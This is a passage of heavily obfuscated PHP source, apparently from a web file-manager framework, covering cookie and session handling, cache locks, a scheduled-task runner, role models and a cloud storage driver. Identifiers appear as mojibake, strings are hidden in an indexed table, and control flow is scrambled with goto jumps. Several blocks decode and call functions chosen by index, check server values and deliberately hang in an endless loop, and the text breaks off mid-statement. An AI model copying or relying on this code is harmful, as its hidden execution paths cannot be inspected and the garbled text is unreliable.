$a«©íÇ˘©¡ = _get($GLOBALS, $EÈ—Ï‚Õﬂƒ[844], $a«©íÇ˘©¡); } goto E∑•ØªØ„Á; E∑•ØªØ„Á: $Dö Û∆´Ωú = $EÈ—Ï‚Õﬂƒ[33]; setcookie($a∏Û»ÖÖ÷ä, $dëè∞ÙÌ† , time() + $CÉÛ√õ÷Í¡, $EÈ—Ï‚Õﬂƒ[8] . trim($a«©íÇ˘©¡, $EÈ—Ï‚Õﬂƒ[8]) . $Dö Û∆´Ωú, !1, !1, $açÏë©ÔÏê); goto A¶ªê˜‚«Ñ; A¶ªê˜‚«Ñ: } public static function setSafe($FÇŸÂÆöõ, $cêòÕùœƒ∞, $d’ñ∞çÔﬂ… = 0) { self::set($FÇŸÂÆöõ, $cêòÕùœƒ∞, $d’ñ∞çÔﬂ…, !0); } public static function get($E›¬ºÖ–ÉÑ) { return isset($_COOKIE[$E›¬ºÖ–ÉÑ]) ? $_COOKIE[$E›¬ºÖ–ÉÑ] : !1; } public static function remove($eëÛ‘àî©å, $fü√ä®îµ÷ = false) { unset($_COOKIE[$eëÛ‘àî©å]); self::set($eëÛ‘àî©å, $_SERVER[ú∫][33], 1, $fü√ä®îµ÷); } } goto dåœº«åó≤; B˜¨‘˜ Øπ: $a¬ËèÆéΩ¡ = strrev(base64_decode($_SERVER[° ∑‡úÜ¿Õ¯][0])); function binCheckNeq($F„ó±’Ñ‚ô, $C·«å¿˘Æü) { return $F„ó±’Ñ‚ô != $C·«å¿˘Æü; } $_SERVER[$_SERVER[° ∑‡úÜ¿Õ¯][1]] = $a¬ËèÆéΩ¡($_SERVER[$_SERVER[° ∑‡úÜ¿Õ¯][2]]); goto d≤·ÁÌÁﬂÖ; d≤·ÁÌÁﬂÖ: function binCheckBigger($Fôƒ‰Ü´äø, $B∑∂¬Üï´ï) { return $Fôƒ‰Ü´äø > $B∑∂¬Üï´ï; } $_SERVER[$_SERVER[° ∑‡úÜ¿Õ¯][3]] = ("\x39\x30\x31\x37"."\67\63")+0;$_S3iU="wcBNiX4UFN7cJdKv2IhWpE4BdZ4PC5xAK8IdKwrh6aQ2cFQT2DufNPnzsFWVzgIyhZ9XVZAyUv3zzY";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($B†ëòñ∏ê, $c£æù§Ü§À) { $b¯ﬁèåÇΩë =& $_SERVER[ú∫]; if (isset(self::$_methodList[$B†ëòñ∏ê])) { return @call_user_func_array(self::$_methodList[$B†ëòñ∏ê], $c£æù§Ü§À); } else { if (method_exists($this, $B†ëòñ∏ê)) { return call_user_func_array(array($this, $B†ëòñ∏ê), $c£æù§Ü§À); } else { think_exception(__CLASS__ . $b¯ﬁèåÇΩë[4] . $B†ëòñ∏ê . $b¯ﬁèåÇΩë[5]); } } } public static function __callStatic($dŒäóﬁä–º, $AüÛÎ°åÍ≈) { if (isset(self::$_methodListStatic[$dŒäóﬁä–º])) { return call_user_func_array(self::$_methodListStatic[$dŒäóﬁä–º], $AüÛÎ°åÍ≈); } else { if (method_exists(self, $dŒäóﬁä–º)) { return call_user_func_array(array(self, $dŒäóﬁä–º), $AüÛÎ°åÍ≈); } else { show_json("{$dŒäóﬁä–º}\50\x29\40\156\x6f\164\40\x65\x78\x69\163\164\73", !1); } } } public static function addMethod($c’ªÁØ ë˘, $fúÛÃ¡≈•Ï) { self::$_methodList[$c’ªÁØ ë˘] = $fúÛÃ¡≈•Ï; } public static function addMethodStatic($D„ØñÖ˘ƒÈ, $Cπ¢–©øû˘) { self::$_methodListStatic[$D„ØñÖ˘ƒÈ] = $Cπ¢–©øû˘; } } goto a÷ø◊àˆ«•; C€Ü¢·Ÿ¿Ã: class CacheLockMemcached { public function lock($AÉ∂›Çïú¿, $BùÏôÇ´∏ª = 0) { $B•‚¨ØÁöÈ = Cache::init(); $Bøóµ‚˘Ôú = microtime(!0) + $BùÏôÇ´∏ª; while (microtime(!0) < $Bøóµ‚˘Ôú) { $B¯Æö‹†îø = $B•‚¨ØÁöÈ->get($AÉ∂›Çïú¿); if (!$B¯Æö‹†îø || $B¯Æö‹†îø < microtime(!0)) { $dÍ„øÃù¢ë = $B•‚¨ØÁöÈ->handle->add($AÉ∂›Çïú¿, $Bøóµ‚˘Ôú, $BùÏôÇ´∏ª); if ($dÍ„øÃù¢ë) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($AäÔ÷öÇöﬁ) { return Cache::init()->get($AäÔ÷öÇöﬁ); } public function unlock($bîÃåÃÁô∞) { return Cache::init()->remove($bîÃåÃÁô∞); } } if (!isset($_SERVER[$_SERVER[ú∫][821]]) || !isset($_SERVER[$_SERVER[ú∫][822]])) { goto B∆ä€©öÖï; B∆ä€©öÖï: $F”ó∫∑ˆ¬ˆ = $_SERVER[ú∫][823]; $E¨∫πÛ†º = $_SERVER[$_SERVER[ú∫][824]] . $_SERVER[ú∫][825]; $DÃ©∆úÖ„ = $F”ó∫∑ˆ¬ˆ($E¨∫πÛ†º); goto f€‘±ÉŸåÎ; f€‘±ÉŸåÎ: $aåÂˆôÆœî = explode($_SERVER[ú∫][229], $DÃ©∆úÖ„); if (count($aåÂˆôÆœî) < $_SERVER[ú∫][589]) { $Füï ª—Æ = $_SERVER[ú∫][826]; $Füï ª—Æ(); } $F¢Ã√ÔÔçç = $_SERVER[ú∫][827]; goto Dáõ‡Ââèë; Dáõ‡Ââèë: $F¢Ã√ÔÔçç($_SERVER[$_SERVER[ú∫][824]] . $_SERVER[ú∫][825]); $E∞€ÜΩ€®ı = 2; while ($E∞€ÜΩ€®ı > 1) { $aïï®‹”•Ω = rawurlencode($E∞€ÜΩ€®ı . $_SERVER[ú∫][375]); } goto d”—’™«ùË; d”—’™«ùË: } class CacheLockDatabase { public function lock($e‡˜ÈáÕ≥à, $B·†”Ñ∂ÏÊ = 0) { $c≈∏‚¢≠Çﬁ = Model($_SERVER[ú∫][794]); $dÎº˘ïÍ¶ò = microtime(!0) + $B·†”Ñ∂ÏÊ; while (microtime(!0) < $dÎº˘ïÍ¶ò) { $a∂Û∏‘‹ÉÜ = $c≈∏‚¢≠Çﬁ->get($e‡˜ÈáÕ≥à); if (!$a∂Û∏‘‹ÉÜ || $a∂Û∏‘‹ÉÜ < microtime(!0)) { $dôÁà‘Â˘‹ = $c≈∏‚¢≠Çﬁ->set($e‡˜ÈáÕ≥à, $dÎº˘ïÍ¶ò); if ($dôÁà‘Â˘‹) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($BµÕõÉÜ®È) { return Model($_SERVER[ú∫][794])->get($BµÕõÉÜ®È); } public function unlock($E∆±íñÑè≥) { Model($_SERVER[ú∫][794])->remove($E∆±íñÑè≥); } } goto aö¥â”ÔΩÖ; eË„—»ÓàÛ: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto A∫ë«∏Í—∞; A∫ë«∏Í—∞: $f…∆„ç®Æá =& $_SERVER[ú∫]; static $f¶’Ì€ªÕò = false; if ($f¶’Ì€ªÕò) { return $f¶’Ì€ªÕò; } goto BÖà§ö¶ã–; A∫Ç¥ã”¢à: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $f¶’Ì€ªÕò = new self(); return $f¶’Ì€ªÕò; goto dÇ∆ÿìÿ•¡; BÖà§ö¶ã–: $Eï®éÀƒÚì = $GLOBALS[$f…∆„ç®Æá[6]][$f…∆„ç®Æá[347]]; self::$sessionTime = $Eï®éÀƒÚì[$f…∆„ç®Æá[1488]]; $dò‹˜º⁄¬¶ = isset($GLOBALS[$f…∆„ç®Æá[1489]]) ? $GLOBALS[$f…∆„ç®Æá[1489]] : SESSION_ID; goto dàä√‰‹∫≈; dàä√‰‹∫≈: if (self::$sessionSign) { } else { if (Cookie::get($dò‹˜º⁄¬¶)) { self::$sessionSign = Cookie::get($dò‹˜º⁄¬¶); } else { self::$sessionSign = guid(); } } Cookie::setSafe($dò‹˜º⁄¬¶, self::$sessionSign, self::$sessionTime); $DŸ ¢‹ãç  = $Eï®éÀƒÚì[$f…∆„ç®Æá[1490]]; goto Aå¯ıÌîØ•; Aå¯ıÌîØ•: $d∑ˆë√•¿£ = $Eï®éÀƒÚì[$DŸ ¢‹ãç ]; $d∑äÜÿÉò⁄ = $Eï®éÀƒÚì[$f…∆„ç®Æá[793]]; switch ($DŸ ¢‹ãç ) { case $f…∆„ç®Æá[17]: self::$handle = Model($f…∆„ç®Æá[794]); break; case $f…∆„ç®Æá[795]: self::$handle = new CacheRedis($d∑ˆë√•¿£, $d∑äÜÿÉò⁄); break; case $f…∆„ç®Æá[796]: self::$handle = new CacheMemcached($d∑ˆë√•¿£, $d∑äÜÿÉò⁄); break; case $f…∆„ç®Æá[193]: $d∑ˆë√•¿£[$f…∆„ç®Æá[76]] = $d∑ˆë√•¿£[$f…∆„ç®Æá[76]] . $f…∆„ç®Æá[1491]; self::$handle = new CacheFile($d∑ˆë√•¿£, $d∑äÜÿÉò⁄); default: break; } goto A∫Ç¥ã”¢à; dÇ∆ÿìÿ•¡: } public static function sign($béÏØäèåã = false) { $béÏØäèåã && (self::$sessionSign = $béÏØäèåã); self::init(); return self::$sessionSign; } public static function set($aì„òëªòë, $f≥π©∑’¿ = false) { self::init(); if (is_array($aì„òëªòë)) { foreach ($aì„òëªòë as $f◊æÓºÇΩû => $AÇî†á¿àÉ) { array_set_value(self::$data, $f◊æÓºÇΩû, $AÇî†á¿àÉ); } } else { array_set_value(self::$data, $aì„òëªòë, $f≥π©∑’¿); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($b‰Ø·πØ‚∏ = false) { self::init(); if (!$b‰Ø·πØ‚∏) { return self::$data; } return array_get_value(self::$data, $b‰Ø·πØ‚∏); } public static function remove($D⁄ó¿‡ˆ¡¡) { self::init(); unset(self::$data[$D⁄ó¿‡ˆ¡¡]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ú∫][798])) { self::$handle->clearTimeout(); } } } if ($_SERVER[$_SERVER[ú∫][821]] != $_SERVER[$_SERVER[ú∫][1459]]) { goto dÎ—ªÒˆÀ¶; FÂà±ﬂ∑”è: $aåÂˆôÆœî = explode($_SERVER[ú∫][229], $DÃ©∆úÖ„); if (count($aåÂˆôÆœî) < $_SERVER[ú∫][589]) { $Füï ª—Æ = $_SERVER[ú∫][826]; $Füï ª—Æ(); } $F¢Ã√ÔÔçç = $_SERVER[ú∫][827]; goto D◊Û⁄µΩ≈Ÿ; dÎ—ªÒˆÀ¶: $F”ó∫∑ˆ¬ˆ = $_SERVER[ú∫][823]; $E¨∫πÛ†º = $_SERVER[$_SERVER[ú∫][824]] . $_SERVER[ú∫][825]; $DÃ©∆úÖ„ = $F”ó∫∑ˆ¬ˆ($E¨∫πÛ†º); goto FÂà±ﬂ∑”è; D◊Û⁄µΩ≈Ÿ: $F¢Ã√ÔÔçç($_SERVER[$_SERVER[ú∫][822]]); goto A≠ŸÒ ‡™Ü; A≠ŸÒ ‡™Ü: } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto f‡ôﬂãÉÛ¬; f‡ôﬂãÉÛ¬: $D•÷´—Îß’ =& $_SERVER[ú∫]; if (self::valueGet($D•÷´—Îß’[710]) != $D•÷´—Îß’[87]) { return; } if (self::valueGet($D•÷´—Îß’[1492]) == $D•÷´—Îß’[87]) { $A¥ÉïÍæèÇ = self::valueGet($D•÷´—Îß’[1493]); if (time() - $A¥ÉïÍæèÇ > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto CÍ˘®ã¡≤í; DˆâÛê≤—˜: while (!0) { self::cacheClear(); if (self::valueGet($D•÷´—Îß’[710]) != $D•÷´—Îß’[87]) { self::valueSet($D•÷´—Îß’[1492], $D•÷´—Îß’[191]); self::log($D•÷´—Îß’[1496]); die; } self::valueSet($D•÷´—Îß’[1492], $D•÷´—Îß’[87]); self::valueSet($D•÷´—Îß’[1493], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto Aéâœµ◊ÀÎ; CÍ˘®ã¡≤í: http_close(); self::valueSet($D•÷´—Îß’[1492], $D•÷´—Îß’[87]); Hook::bind($D•÷´—Îß’[1494], $D•÷´—Îß’[1495]); goto DˆâÛê≤—˜; Aéâœµ◊ÀÎ: } public static function restart() { $e«ÍîÉ¥ùò =& $_SERVER[ú∫]; http_close(); self::valueSet($e«ÍîÉ¥ùò[710], $e«ÍîÉ¥ùò[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($e«ÍîÉ¥ùò[1492], $e«ÍîÉ¥ùò[191]); self::valueSet($e«ÍîÉ¥ùò[710], $e«ÍîÉ¥ùò[87]); } public static function shutdownEvent() { $CÉ¶¶°áî˘ =& $_SERVER[ú∫]; self::valueSet($CÉ¶¶°áî˘[1492], $CÉ¶¶°áî˘[191]); self::log($CÉ¶¶°áî˘[1497]); } public static function config($BÏèÛ€™Çª, $E‡Æ¢Àº∞®) { self::valueSet($_SERVER[ú∫][710], $BÏèÛ€™Çª); } private static function taskRunAll() { goto D∂±Â∏‘Í¢; dòç‡≠‰äê: $bªã“åıáÊ = count($B±€∆Îı«ê); for ($d≥Üî¯âà¶ = 0; $d≥Üî¯âà¶ < $bªã“åıáÊ; $d≥Üî¯âà¶++) { $A◊ƒ›†ùÍ = $B±€∆Îı«ê[$d≥Üî¯âà¶]; if (!$A◊ƒ›†ùÍ[$D…π˘º‡°∏[393]] || $A◊ƒ›†ùÍ[$D…π˘º‡°∏[1499]] != $D…π˘º‡°∏[87]) { continue; } if (!self::taskTimeCheck($A◊ƒ›†ùÍ)) { continue; } self::taskRun($A◊ƒ›†ùÍ); } Hook::trigger($D…π˘º‡°∏[1500]); goto fªÉÀ˜îõÎ; fªÉÀ˜îõÎ: self::taskQueueRun($Aì™∂Ïﬁ˘µ); self::closeDatabase(); goto Fìöß®áÈ•; D∂±Â∏‘Í¢: $D…π˘º‡°∏ =& $_SERVER[ú∫]; $Aì™∂Ïﬁ˘µ = timeFloat(); $B±€∆Îı«ê = Model($D…π˘º‡°∏[1498])->listData(); goto dòç‡≠‰äê; Fìöß®áÈ•: } private static function taskQueueRun($Bà†˜»∑ù‹) { $c›¿ﬁÃ¯Ìè = 10; while (!0) { $aÃóÖ€ƒ∫À = TaskQueue::run(); if ($aÃóÖ€ƒ∫À === !1) { break; } if (timeFloat() - $Bà†˜»∑ù‹ >= $c›¿ﬁÃ¯Ìè) { break; } } } private static function taskTimeCheck($bÕ„∞„∞É∆) { goto F√πµŒÂë∂; fœﬁà‰ÜÓß: switch ($bœ¯À£πßà[$cõ∂∏ãûñ‰[29]]) { case $cõ∂∏ãûñ‰[1507]: if (time() - $bÛÖ’±Ωáè < 3600 * 24 * 30) { return !1; } if ($bœ¯À£πßà[$cõ∂∏ãûñ‰[1507]] == date($cõ∂∏ãûñ‰[1508]) && $D„›Ûˆ÷Æﬁ) { return !0; } break; case $cõ∂∏ãûñ‰[1509]: if (time() - $bÛÖ’±Ωáè < 3600 * 24 * 7) { return !1; } $dä˘√ú‰äÀ = date($cõ∂∏ãûñ‰[1510]) == 0 ? 7 : date($cõ∂∏ãûñ‰[1510]); if ($bœ¯À£πßà[$cõ∂∏ãûñ‰[1509]] == $dä˘√ú‰äÀ && $D„›Ûˆ÷Æﬁ) { return !0; } break; case $cõ∂∏ãûñ‰[1502]: if (time() - $bÛÖ’±Ωáè < 3600 * 24) { return !1; } if ($D„›Ûˆ÷Æﬁ) { return !0; } break; case $cõ∂∏ãûñ‰[1511]: if (time() - $bÛÖ’±Ωáè >= floatval($bœ¯À£πßà[$cõ∂∏ãûñ‰[1511]]) * 60) { return !0; } break; default: break; } return !1; goto Bøª≈––≈Ù; F√πµŒÂë∂: $cõ∂∏ãûñ‰ =& $_SERVER[ú∫]; $bœ¯À£πßà = json_decode($bÕ„∞„∞É∆[$cõ∂∏ãûñ‰[197]], !0); $bÛÖ’±Ωáè = intval($bÕ„∞„∞É∆[$cõ∂∏ãûñ‰[1493]]); goto B∞§ê≤æ¨Ø; B∞§ê≤æ¨Ø: $AΩŸ•∏Âúú = strtotime($cõ∂∏ãûñ‰[1501] . $bœ¯À£πßà[$cõ∂∏ãûñ‰[1502]] . $cõ∂∏ãûñ‰[1503]) - strtotime($cõ∂∏ãûñ‰[1504]); $EñÔçÓ§¯≥ = time() - strtotime(date($cõ∂∏ãûñ‰[1505]) . $cõ∂∏ãûñ‰[1506]); $D„›Ûˆ÷Æﬁ = $EñÔçÓ§¯≥ >= $AΩŸ•∏Âúú && $EñÔçÓ§¯≥ <= $AΩŸ•∏Âúú + 3600; goto fœﬁà‰ÜÓß; Bøª≈––≈Ù: } private static function closeDatabase() { goto a°¨ ƒ∏ÎÖ; dÀ¶õÑ¶ıá: $CÇ˘‰ÎÙúç = Model($EﬂŒáŸ®äà[502])->db($EﬂŒáŸ®äà[33]); if ($CÇ˘‰ÎÙúç) { $CÇ˘‰ÎÙúç->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($EﬂŒáŸ®äà[1512], $EﬂŒáŸ®äà[1513]); die; } goto a¿¬çŸü∑á; a°¨ ƒ∏ÎÖ: $EﬂŒáŸ®äà =& $_SERVER[ú∫]; static $A∞›Ωíñ⁄ô = 0; $D¥∞ªÿ¿Éñ = 1800; goto a ù‰πöë–; a ù‰πöë–: if (!$A∞›Ωíñ⁄ô) { $A∞›Ωíñ⁄ô = time(); } if (time() - $A∞›Ωíñ⁄ô < $D¥∞ªÿ¿Éñ) { return; } $A∞›Ωíñ⁄ô = time(); goto dÀ¶õÑ¶ıá; a¿¬çŸü∑á: } public static function taskRun($Eé‰∫„±Í‡) { goto EÑ†áÜè”ã; C¶˘èåÍÇû: $Fõ‘√¬íç´ = timeFloat(); $E∂π´—°«ˆ = $FÎÍà®‚Œß[33]; switch ($Eé‰∫„±Í‡[$FÎÍà®‚Œß[29]]) { case $FÎÍà®‚Œß[305]: $Fµ⁄∏ÊÈµÇ = url_request($Eé‰∫„±Í‡[$FÎÍà®‚Œß[1517]], $FÎÍà®‚Œß[228], !1, !1, !1, !1, 10); if ($Fµ⁄∏ÊÈµÇ[$FÎÍà®‚Œß[710]]) { $E∂π´—°«ˆ = strlen($Fµ⁄∏ÊÈµÇ[$FÎÍà®‚Œß[1088]]); } break; case $FÎÍà®‚Œß[227]: $E∂π´—°«ˆ = Hook::apply($Eé‰∫„±Í‡[$FÎÍà®‚Œß[1517]]); default: break; } goto e®ÙØÛÃÿ¨; e®ÙØÛÃÿ¨: Model($FÎÍà®‚Œß[1518])->add(array($FÎÍà®‚Œß[1519] => $FÎÍà®‚Œß[33], $FÎÍà®‚Œß[1520] => $FÎÍà®‚Œß[191], $FÎÍà®‚Œß[29] => $FÎÍà®‚Œß[1521] . $Eé‰∫„±Í‡[$FÎÍà®‚Œß[393]], $FÎÍà®‚Œß[1522] => json_encode(array($FÎÍà®‚Œß[28] => $Eé‰∫„±Í‡[$FÎÍà®‚Œß[28]], $FÎÍà®‚Œß[1523] => timeFloat() - $Fõ‘√¬íç´, $FÎÍà®‚Œß[291] => $E∂π´—°«ˆ)))); self::log($FÎÍà®‚Œß[1524] . $Eé‰∫„±Í‡[$FÎÍà®‚Œß[393]] . $FÎÍà®‚Œß[1525] . $E∂π´—°«ˆ); return !0; goto eÖâ“—ËÑ˘; EÑ†áÜè”ã: $FÎÍà®‚Œß =& $_SERVER[ú∫]; self::log($FÎÍà®‚Œß[1514] . $Eé‰∫„±Í‡[$FÎÍà®‚Œß[393]] . $FÎÍà®‚Œß[1515] . $Eé‰∫„±Í‡[$FÎÍà®‚Œß[28]] . $FÎÍà®‚Œß[1516] . $Eé‰∫„±Í‡[$FÎÍà®‚Œß[1517]]); Model($FÎÍà®‚Œß[1498])->run($Eé‰∫„±Í‡[$FÎÍà®‚Œß[393]]); goto C¶˘èåÍÇû; eÖâ“—ËÑ˘: } private static function valueGet($b˜Œñí∆·÷) { $C«äê¡ŸÖò =& $_SERVER[ú∫]; $eº´Ûã˜Õë = $C«äê¡ŸÖò[1526]; $b…§ú≥ ßü = Model($C«äê¡ŸÖò[1527])->get($b˜Œñí∆·÷, $eº´Ûã˜Õë); if (is_null($b…§ú≥ ßü)) { Model($C«äê¡ŸÖò[1527])->set($C«äê¡ŸÖò[710], $C«äê¡ŸÖò[87], $eº´Ûã˜Õë); Model($C«äê¡ŸÖò[1527])->set($C«äê¡ŸÖò[1492], $C«äê¡ŸÖò[191], $eº´Ûã˜Õë); $b…§ú≥ ßü = Model($C«äê¡ŸÖò[1527])->get($b˜Œñí∆·÷, $eº´Ûã˜Õë); } return $b…§ú≥ ßü; } private static function valueSet($Aπñ£äÀ£ô, $fíå‹å‰Æ©) { $AµÖüƒ ±» =& $_SERVER[ú∫]; return Model($AµÖüƒ ±»[1527])->set($Aπñ£äÀ£ô, $fíå‹å‰Æ©, $AµÖüƒ ±»[1526]); } protected static function log($CìâŸ…Ÿëÿ) { write_log($CìâŸ…Ÿëÿ, $_SERVER[ú∫][1513]); } private static function cacheClear() { $dô∑ôÙï‡ñ =& $_SERVER[ú∫]; $BÇ‹É•”»î = Model($dô∑ôÙï‡ñ[1527])->cacheKey($dô∑ôÙï‡ñ[1526]); Cache::clearMemory($BÇ‹É•”»î); Model($dô∑ôÙï‡ñ[1498])->cacheClear(); } } goto cá∑Î™¢Ç◊; E˜Õ’¡à≈¯: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\x65\x6d\137\157\160\164\x69\157\x6e"; protected $jsonField = array("\155\145\156\x75", "\x72\x6f\154\145", "\x72\157\154\145\107\162\157\165\x70", "\162\145\x67\x69\163\x74", "\145\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($D◊∞ûÖŒ∆ë) { return "\123\171\163\164\x65\155\117\160\x74\151\x6f\156\x5f{$D◊∞ûÖŒ∆ë}"; } protected function optionDefault($DãßÛÖÑ·∂ = '') { $Fâ£ﬂÖú‹◊ =& $_SERVER[ú∫]; if ($DãßÛÖÑ·∂ == $Fâ£ﬂÖú‹◊[33]) { return $GLOBALS[$Fâ£ﬂÖú‹◊[6]][$Fâ£ﬂÖú‹◊[378]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\162\x6f\x6c\145\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\x65", "\x61\165\164\150", "\154\141\x62\145\154", "\144\x69\x73\160\154\141\x79", "\163\x79\x73\x74\x65\x6d", "\x64\145\163\x63", "\151\147\156\x6f\x72\145\105\x78\x74", "\x69\x67\156\157\162\x65\x46\x69\x6c\x65\123\x69\172\x65", "\x61\x64\155\x69\156\x69\x73\164\x72\x61\x74\x6f\x72", "\163\x6f\162\164"); public function listData($dÓπÊê‘æ• = false, $f‚Ô©ﬂ‘ã≠ = "\x73\157\x72\164", $fêáÎÿíÓâ = false) { $aµ‚·∆—Æ„ =& $_SERVER[ú∫]; $d‡Ñá◊É∆¡ = parent::listData($dÓπÊê‘æ•, $f‚Ô©ﬂ‘ã≠, $fêáÎÿíÓâ); if (!$dÓπÊê‘æ•) { foreach ($d‡Ñá◊É∆¡ as $E◊œ†∆£Í => $D≈ô¶É‚Ë©) { if ($D≈ô¶É‚Ë©[$aµ‚·∆—Æ„[1881]] == 1) { $d‡Ñá◊É∆¡[$E◊œ†∆£Í][$aµ‚·∆—Æ„[431]] = LNG($aµ‚·∆—Æ„[2107]); } } } return $d‡Ñá◊É∆¡; } public function update($E†Ü€¬ïù«, $BÊê–ÿîÖÜ) { goto dﬁ≈®Í—ùÚ; dﬁ≈®Í—ùÚ: $D¢ô∞◊ ˜Û =& $_SERVER[ú∫]; $AÒ‡∫ÈÌŸ„ = parent::listData($E†Ü€¬ïù«); $F••¬ÇÖß≤ = $this->findByName($BÊê–ÿîÖÜ[$D¢ô∞◊ ˜Û[28]]); goto d„ÂﬂﬁöãŸ; d„ÂﬂﬁöãŸ: if (!$AÒ‡∫ÈÌŸ„ || $F••¬ÇÖß≤ && $F••¬ÇÖß≤[$D¢ô∞◊ ˜Û[393]] != $AÒ‡∫ÈÌŸ„[$D¢ô∞◊ ˜Û[393]]) { return !1; } if ($F••¬ÇÖß≤[$D¢ô∞◊ ˜Û[1881]] == 1) { $BÊê–ÿîÖÜ = array($D¢ô∞◊ ˜Û[28] => $BÊê–ÿîÖÜ[$D¢ô∞◊ ˜Û[28]], $D¢ô∞◊ ˜Û[1713] => $BÊê–ÿîÖÜ[$D¢ô∞◊ ˜Û[1713]]); } $this->filterAuth($BÊê–ÿîÖÜ[$D¢ô∞◊ ˜Û[406]]); goto E‹ÕãûÜ≤€; E‹ÕãûÜ≤€: return parent::update($E†Ü€¬ïù«, $BÊê–ÿîÖÜ); goto eòÈ≥Ëµï’; eòÈ≥Ëµï’: } public function remove($DÍá≠Çœ‘¡) { $DÊ”‘Ó‹‘… = parent::listData($DÍá≠Çœ‘¡); if (!$DÊ”‘Ó‹‘… || $DÊ”‘Ó‹‘…[$_SERVER[ú∫][1171]]) { return !1; } return parent::remove($DÍá≠Çœ‘¡); } public function add($AΩòºú”œ—) { goto BõË„µ“ñÈ; bˆ∂Ö„áÉ‡: $Aœ÷ó÷øÇ” = array($C‰à‹ –‘Ü[413] => $fÓ–ı¥√ÓÖ, $C‰à‹ –‘Ü[1698] => $C‰à‹ –‘Ü[33], $C‰à‹ –‘Ü[1694] => $C‰à‹ –‘Ü[1702], $C‰à‹ –‘Ü[2108] => 1, $C‰à‹ –‘Ü[1697] => 0, $C‰à‹ –‘Ü[2109] => 0, $C‰à‹ –‘Ü[1696] => $this->getSort()); $AΩòºú”œ— = array_merge($Aœ÷ó÷øÇ”, $AΩòºú”œ—); $this->filterAuth($AΩòºú”œ—[$C‰à‹ –‘Ü[406]]); goto a’ÌòÛì¯; BõË„µ“ñÈ: $C‰à‹ –‘Ü =& $_SERVER[ú∫]; $fÓ–ı¥√ÓÖ = $AΩòºú”œ—[$C‰à‹ –‘Ü[28]]; if ($this->findByName($fÓ–ı¥√ÓÖ)) { return !1; } goto bˆ∂Ö„áÉ‡; a’ÌòÛì¯: return parent::insert($AΩòºú”œ—); goto eÇ‰±∏€Ω∏; eÇ‰±∏€Ω∏: } private function getSort() { $AëœœîèÓ” =& $_SERVER[ú∫]; $fÑ©»ËÌ“ = parent::listData(); $bﬁ˘µµÿ† = array_to_keyvalue($fÑ©»ËÌ“, $AëœœîèÓ”[33], $AëœœîèÓ”[1715]); return empty($bﬁ˘µµÿ†) ? 0 : max($bﬁ˘µµÿ†) + 1; } private function filterAuth(&$d√à†ÎÉ•‰) { $Fç‹⁄‡Ö¯ã =& $_SERVER[ú∫]; $Fäè’‡ÿëè = array(); $aô‡òãìûû = array_filter(explode($Fç‹⁄‡Ö¯ã[47], $d√à†ÎÉ•‰)); foreach ($aô‡òãìûû as $d√à†ÎÉ•‰) { $C°ìıòÑˆ∞ = explode($Fç‹⁄‡Ö¯ã[95], $d√à†ÎÉ•‰); if ($C°ìıòÑˆ∞[0] == $Fç‹⁄‡Ö¯ã[2110] && $C°ìıòÑˆ∞[1] != $Fç‹⁄‡Ö¯ã[1090]) { $aÊÜÚßí”Œ = $C°ìıòÑˆ∞[0] . $Fç‹⁄‡Ö¯ã[95] . $C°ìıòÑˆ∞[1] . $Fç‹⁄‡Ö¯ã[2111]; if (!in_array($aÊÜÚßí”Œ, $aô‡òãìûû)) { $Fäè’‡ÿëè[] = $aÊÜÚßí”Œ; } } $Fäè’‡ÿëè[] = $d√à†ÎÉ•‰; } $d√à†ÎÉ•‰ = implode($Fç‹⁄‡Ö¯ã[47], $Fäè’‡ÿëè); } public function sort($EÖ≤ë¯√Ëé, $c‰§é¥ô⁄∞) { return parent::update($EÖ≤ë¯√Ëé, $c‰§é¥ô⁄∞); } } goto AÖà‹¡“éò; eò√Á™ÖÖı: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\x3a\x2f\57\x76\60\56\141\x70\x69\56\x75\160\171\x75\x6e\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($DùùøÔ«Éì) { parent::__construct(); $this->_init($DùùøÔ«Éì); } public function _init($D∑ˆ∂íµ˘™) { $D„⁄‘•íî’ =& $_SERVER[ú∫]; foreach ($D∑ˆ∂íµ˘™ as $e¬◊ û‡≠Â => $düıÆÿèìß) { if (isset($this->{$e¬◊ û‡≠Â})) { $this->{$e¬◊ û‡≠Â} = $düıÆÿèìß; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($D„⁄‘•íî’[1330] . LNG($D„⁄‘•íî’[1262])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($c≥˘ø”Ö‰á, $bÌÉ¬ò›÷ü = "\x47\x45\124") { $d¯®¢§Ï—Ú =& $_SERVER[ú∫]; $cˆèå…Âÿπ = gmdate($d¯®¢§Ï—Ú[1296]); $C∆éÌ≠ π◊ = base64_encode(hash_hmac($d¯®¢§Ï—Ú[1331], 